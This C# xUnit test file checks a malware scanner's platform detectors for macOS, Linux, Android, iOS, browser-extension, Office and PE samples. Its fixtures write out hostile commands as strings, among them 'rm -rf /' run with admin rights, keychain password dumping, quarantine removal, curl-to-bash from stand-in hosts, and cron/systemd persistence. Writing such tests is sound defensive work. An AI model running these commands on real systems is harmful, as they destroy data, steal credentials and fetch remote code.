using System.Linq;
using AntiStealerOneExe;
using Xunit;

namespace AntiStealer.Tests
{
    public class PlatformDetectorsTests
    {
        private static AnalysisResult Make(string fileType, params string[] strings)
        {
            var r = new AnalysisResult("x") { FileType = fileType };
            r.StringHits.AddRange(strings);
            return r;
        }

        // 2.4 ----------------------------------------------------------------

        [Fact]
        public void Mac_KeychainAndGatekeeperBypass_Detected()
        {
            var r = Make("Mach-O",
                "/Library/LaunchAgents/com.apple.cache.plist",
                "xattr -d com.apple.quarantine /tmp/payload",
                "security find-generic-password -w");
            var hits = MacDetector.Detect(r);
            Assert.Contains("mac:persistence_launchagent", hits);
            Assert.Contains("mac:gatekeeper_bypass",       hits);
            Assert.Contains("mac:keychain_cli",            hits);
        }

        [Fact]
        public void Mac_OsascriptAdminPrompt_Detected()
        {
            var r = Make("APP",
                "osascript -e",
                "do shell script \"rm -rf /\" with administrator privileges");
            var hits = MacDetector.Detect(r);
            Assert.Contains("mac:applescript_runner",       hits);
            Assert.Contains("mac:applescript_shell",        hits);
            Assert.Contains("mac:applescript_admin_prompt", hits);
        }

        [Fact]
        public void Mac_NoHits_OnPlainWindowsBinary()
        {
            var r = Make("PE32", "kernel32.dll", "regular pe content");
            Assert.Empty(MacDetector.Detect(r));
        }

        // 2.5 ----------------------------------------------------------------

        [Fact]
        public void Linux_PersistenceAndShebang_Detected()
        {
            var r = Make("ELF64",
                "#!/bin/bash",
                "echo */5 * * * * curl https://x/p | bash > /etc/cron.d/x",
                "systemctl enable evil.service",
                "/etc/systemd/system/evil.service");
            var hits = LinuxDetector.Detect(r);
            Assert.Contains("linux:shebang_bash",         hits);
            Assert.Contains("linux:curl",                 hits);
            Assert.Contains("linux:persistence_cron",     hits);
            Assert.Contains("linux:systemctl_enable",     hits);
            Assert.Contains("linux:persistence_systemd",  hits);
        }

        [Fact]
        public void Linux_BpfdoorAndLdPreload_Detected()
        {
            var r = Make("ELF64",
                "#!/bin/sh\nls",
                "LD_PRELOAD=/tmp/x.so",
                "BPFdoor implant");
            var hits = LinuxDetector.Detect(r);
            Assert.Contains("linux:ld_preload",       hits);
            Assert.Contains("linux:malware_bpfdoor",  hits);
        }

        [Fact]
        public void Linux_NoHits_OnPe()
        {
            var r = Make("PE32", "kernel32.dll");
            Assert.Empty(LinuxDetector.Detect(r));
        }

        [Fact]
        public void Linux_PipeShAndPipeBash_Detected_WithoutTrailingNewline()
        {
            // Regression: the original markers required a literal "\n" right
            // after "| sh" / "| bash", which the haystack format never
            // produces (it joins entries with '\n', so "| sh" lands at the
            // *end* of an entry, not followed by one). Without the fix
            // these markers never fired against any realistic input.
            var r = Make("ELF64",
                "curl https://malicious.example/install.sh | sh",
                "wget -qO- https://x/y | bash");
            var hits = LinuxDetector.Detect(r);
            Assert.Contains("linux:pipe_sh",   hits);
            Assert.Contains("linux:pipe_bash", hits);
        }

        // 2.6 ----------------------------------------------------------------

        [Fact]
        public void Apk_DangerousPermsAndAccessibility_Detected()
        {
            var r = Make("APK",
                "AndroidManifest.xml",
                "<uses-permission android:name=\"android.permission.BIND_ACCESSIBILITY_SERVICE\"/>",
                "<uses-permission android:name=\"android.permission.READ_SMS\"/>",
                "DexClassLoader newLoader",
                "onAccessibilityEvent");
            var hits = ApkDetector.Detect(r);
            Assert.Contains("apk:perm:bind_accessibility_service", hits);
            Assert.Contains("apk:perm:read_sms",                   hits);
            Assert.Contains("apk:dynamic_dex",                     hits);
            Assert.Contains("apk:accessibility_event",             hits);
        }

        [Fact]
        public void Apk_NoHits_OnPlainExe()
        {
            var r = Make("PE32", "kernel32.dll");
            Assert.Empty(ApkDetector.Detect(r));
        }

        // 2.7 ----------------------------------------------------------------

        [Fact]
        public void Ipa_EntitlementsAndJb_Detected()
        {
            var r = Make("IPA",
                "Payload/MyApp.app/Info.plist",
                "embedded.mobileprovision",
                "MobileSubstrate dyld_insert_libraries",
                "libimo.dylib");
            var hits = IpaDetector.Detect(r);
            Assert.Contains("ipa:info_plist_present",  hits);
            Assert.Contains("ipa:embedded_provision",  hits);
            Assert.Contains("ipa:mobile_substrate",    hits);
            Assert.Contains("ipa:libimo_jb",           hits);
        }

        [Fact]
        public void Ipa_NoHits_OnElf()
        {
            var r = Make("ELF64", "regular elf");
            Assert.Empty(IpaDetector.Detect(r));
        }

        // 2.8 ----------------------------------------------------------------

        [Fact]
        public void BrowserExt_ManifestV3AndCookies_Detected()
        {
            var r = Make("CRX",
                "manifest.json",
                "\"manifest_version\": 3",
                "\"permissions\": [\"cookies\", \"webRequest\", \"<all_urls>\"]",
                "chrome.cookies.getAll");
            var hits = BrowserExtensionDetector.Detect(r);
            Assert.Contains("ext:manifest_v3",       hits);
            Assert.Contains("ext:perm:cookies",      hits);
            Assert.Contains("ext:perm:webRequest",   hits);
            Assert.Contains("ext:perm:all_urls",     hits);
            Assert.Contains("ext:cookies_getall",    hits);
        }

        [Fact]
        public void BrowserExt_EvalAndNativeMessaging_Detected()
        {
            var r = Make("ZIP",
                "manifest.json",
                "\"manifest_version\":2",
                "chrome.runtime.connectNative('com.evil.host')",
                "eval('alert(1)')");
            var hits = BrowserExtensionDetector.Detect(r);
            Assert.Contains("ext:manifest_v2",   hits);
            Assert.Contains("ext:native_messaging", hits);
            Assert.Contains("ext:eval_call",     hits);
        }

        [Fact]
        public void BrowserExt_NoHits_OnExe()
        {
            var r = Make("PE32", "kernel32.dll");
            Assert.Empty(BrowserExtensionDetector.Detect(r));
        }

        // 2.9 ----------------------------------------------------------------

        [Fact]
        public void Office_VbaStompAndAutorun_Detected()
        {
            var r = Make("Word");
            r.OfficeIndicators.Add("ole:vba-project");
            r.StringHits.AddRange(new[]
            {
                "Sub Document_Open()",
                "Application.Run StrReverse(\"olleH\")",
                "vbaProject.bin extracted",
            });
            var hits = OfficeExtraDetector.Detect(r);
            Assert.Contains("office:autorun_document_open", hits);
            Assert.Contains("office:vba_application_run",   hits);
            Assert.Contains("office:vba_strreverse",        hits);
            Assert.Contains("office:vbaproject_bin",        hits);
        }

        [Fact]
        public void Office_RtfObjectMarkers_Detected()
        {
            var r = Make("RTF",
                "{\\objupdate}",
                "{\\objdata 010500000200000004000000}");
            var hits = OfficeExtraDetector.Detect(r);
            Assert.Contains("office:rtf_objupdate", hits);
            Assert.Contains("office:rtf_objdata",   hits);
        }

        [Fact]
        public void Office_NoHits_OnElf()
        {
            var r = Make("ELF64");
            Assert.Empty(OfficeExtraDetector.Detect(r));
        }

        // 2.10 ---------------------------------------------------------------

        [Fact]
        public void Pe_UacAutoElevateAndPacker_Detected()
        {
            var r = Make("PE32",
                "level=\"requireAdministrator\" uiAccess=\"true\"",
                "level=\"highestAvailable\"",
                "autoElevate=\"true\"",
                "VMProtect 3.5.1");
            r.SectionNames.Add(".text");
            var hits = PeExtraDetector.Detect(r);
            Assert.Contains("pe:uac_require_admin",   hits);
            Assert.Contains("pe:uac_highestavailable",hits);
            Assert.Contains("pe:autoelevate_true",    hits);
            Assert.Contains("pe:uiaccess_true",       hits);
            Assert.Contains("pe:packer_vmprotect",    hits);
        }

        [Fact]
        public void Pe_TlsCallbackRwx_Detected()
        {
            var r = Make("PE32", "tls callbacks");
            r.SectionNames.Add(".tls");
            r.ExecutableWritableSections.Add(".tls");
            var hits = PeExtraDetector.Detect(r);
            Assert.Contains("pe:tls_callback_rwx", hits);
        }

        [Fact]
        public void Pe_SideloadBait_OnSignedSample()
        {
            var r = Make("PE32",
                "loads version.dll from cwd",
                "signed by AcmeCorp");
            r.IsSigned = true;
            r.SectionNames.Add(".text");
            var hits = PeExtraDetector.Detect(r);
            Assert.Contains("pe:sideload_bait:version.dll", hits);
        }

        [Fact]
        public void Pe_NoSideloadBait_WhenUnsigned()
        {
            var r = Make("PE32", "loads version.dll");
            r.IsSigned = false;
            r.SectionNames.Add(".text");
            var hits = PeExtraDetector.Detect(r);
            Assert.DoesNotContain(hits, h => h.StartsWith("pe:sideload_bait"));
        }

        // Pipeline -----------------------------------------------------------

        [Fact]
        public void Pipeline_PopulatesAllBuckets()
        {
            var r = Make("Mach-O",
                "/Library/LaunchAgents/com.evil.plist",
                "AndroidManifest.xml",                 // gate-only — APK detector needs AndroidManifest in strings
                "<uses-permission android:name=\"android.permission.READ_SMS\"/>");
            PlatformDetectorPipeline.RunOn(r);
            Assert.Contains("mac:persistence_launchagent", r.MacIndicators);
            // APK only triggers if FileType says APK *or* strings contain AndroidManifest — we did include it.
            Assert.Contains("apk:perm:read_sms",           r.ApkIndicators);
        }

        [Fact]
        public void Pipeline_IsIdempotent()
        {
            var r = Make("ELF64", "#!/bin/bash", "curl https://x | bash");
            PlatformDetectorPipeline.RunOn(r);
            int afterFirst = r.LinuxIndicators.Count;
            PlatformDetectorPipeline.RunOn(r);
            Assert.Equal(afterFirst, r.LinuxIndicators.Count);
        }
    }
}
